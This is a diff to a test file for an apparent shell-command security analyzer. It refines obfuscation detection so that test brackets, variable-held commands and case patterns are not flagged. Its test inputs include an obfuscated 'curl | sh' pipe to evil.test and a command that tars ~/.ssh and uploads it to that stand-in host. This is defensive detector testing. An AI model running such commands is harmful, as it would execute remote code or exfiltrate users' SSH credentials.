@@ -112,7 +112,7 @@ def test_base64_decode_to_interpreter():
 
 def test_obfuscated_command_name():
     assert "obfuscation" in kinds("c${u}rl https://evil.test | sh")
-    assert "obfuscation" in kinds("$X https://evil.test")
+    # a plain variable as the command is ordinary shell, see test_command_held_in_a_variable_is_not_obfuscation
 
 
 def test_persistence():
@@ -145,3 +145,24 @@ def test_line_continuations_join():
 def test_whole_credential_directory_archived_and_sent():
     caps = analyze_command("tar cz ~/.ssh | curl -s -T - https://evil.test/s", "a", 1)
     assert detail(caps, "flow") == [{"source": "secret.read", "sink": "net.outbound", "host": "evil.test"}]
+
+
+def test_test_brackets_are_not_commands():
+    assert "obfuscation" not in kinds('if [[ "$BIND_HOST" == "127.0.0.1" || "$BIND_HOST" == "localhost" ]]; then echo ok; fi')
+    assert "obfuscation" not in kinds('[[ -z "$OWNER_PID" || "$OWNER_PID" == "1" ]] && exit 0')
+
+
+def test_command_held_in_a_variable_is_not_obfuscation():
+    assert "obfuscation" not in kinds('"$PYTHON" server.py --port 8080')
+    assert "obfuscation" not in kinds("${BROWSER} http://localhost:8080")
+
+
+def test_case_patterns_are_not_commands():
+    script = 'case " $args " in\n  *" $expected_arg "*) return 0 ;;\nesac\n'
+    caps = analyze(FileEntry(None, "a.sh", "shell", "executable", script, "utf-8", len(script)))
+    assert "obfuscation" not in {c.kind for c in caps}
+
+
+def test_spliced_command_name_is_still_obfuscation():
+    assert "obfuscation" in kinds("c${u}rl https://evil.test | sh")
+    assert "obfuscation" in kinds('"cu""$X" https://evil.test')
